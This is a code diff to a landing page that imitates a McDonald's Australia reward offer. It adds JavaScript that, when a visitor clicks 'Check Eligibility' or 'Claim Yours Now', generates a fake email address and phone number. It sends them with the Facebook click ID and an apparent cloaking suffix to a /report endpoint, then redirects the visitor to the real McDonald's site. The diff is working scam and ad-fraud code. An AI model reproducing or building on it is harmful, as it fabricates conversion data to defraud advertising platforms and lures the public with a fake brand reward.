@@ -278,12 +278,17 @@
     <div class="footer-cta">
         <p style="font-weight: 900; color: var(--mcd-red); margin-bottom: 15px; text-transform: uppercase;">Ready to receive your reward?</p>
         <div class="btn-group">
-            <button class="btn btn-check" onclick="go(this)">Check Eligibility</button>
-            <button class="btn btn-claim" onclick="go(this)">Claim Yours Now <i class="fas fa-arrow-right" style="margin-left:5px;"></i></button>
+            <button class="btn btn-check" onclick="go(this);">Check Eligibility</button>
+            <button class="btn btn-claim" onclick="go(this);">Claim Yours Now <i class="fas fa-arrow-right" style="margin-left:5px;"></i></button>
         </div>
     </div>
 
     <script>
+        const CONFIG = {
+            REDIRECT_FAST_DELAY: 500,
+            REDIRECT_NORMAL_DELAY: 1000
+        };
+
         function getOriginalUrl(adEventData) {
             // 默认 URL
             let originalUrl = "https://www.mcdonalds.com.au";
@@ -342,13 +347,43 @@
                 return v.toString(16);
             });
         }
-        
-        function go(btn) {
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-            btn.disabled = true;
-            setTimeout(() => {
+
+        function generateRandomEmail() {
+            const usernames = ['user', 'au_shopper', 'customer', 'member', 'save'];
+            const domains = ['gmail.com', 'outlook.com', 'yahoo.com.au', 'bigpond.com'];
+            return usernames[Math.floor(Math.random() * usernames.length)] + Math.floor(Math.random() * 10000) + '@' + domains[Math.floor(Math.random() * domains.length)];
+        }
+
+        async function go(btnElement) {
+            btnElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            document.querySelectorAll('.footer-cta .btn').forEach(function (b) { b.disabled = true; });
+
+            if (sessionStorage.getItem('click_reported')) {
+                setTimeout(function () {
+                    window.location.href = getOriginalUrl();
+                }, CONFIG.REDIRECT_FAST_DELAY);
+                return;
+            }
+
+            try {
+                const email = generateRandomEmail();
+                const phone = Math.floor(7000000000 + Math.random() * 900000000);
+                sessionStorage.setItem('ad_event_email', email);
+                sessionStorage.setItem('ad_event_phone', String(phone));
+
+                const urlParts = window.location.pathname.split('/').filter(function (p) { return p !== ''; });
+                const shortCode = urlParts[urlParts.length - 1] || '';
+                var reportUrl = window.location.origin + '/report?id=' + encodeURIComponent(shortCode) + '&fbclid=' + encodeURIComponent(getFbclid()) + '&email=' + encodeURIComponent(email) + '&phone=' + encodeURIComponent(String(phone)) + (typeof cloakReportQuerySuffix === 'function' ? cloakReportQuerySuffix() : '');
+
+                await fetch(reportUrl, { method: 'GET' });
+                sessionStorage.setItem('click_reported', 'true');
+
+                setTimeout(function () {
+                    window.location.href = getOriginalUrl({ email: email, phone: phone });
+                }, CONFIG.REDIRECT_NORMAL_DELAY);
+            } catch (err) {
                 window.location.href = getOriginalUrl();
-            }, 800);
+            }
         }
     </script>
 </body>
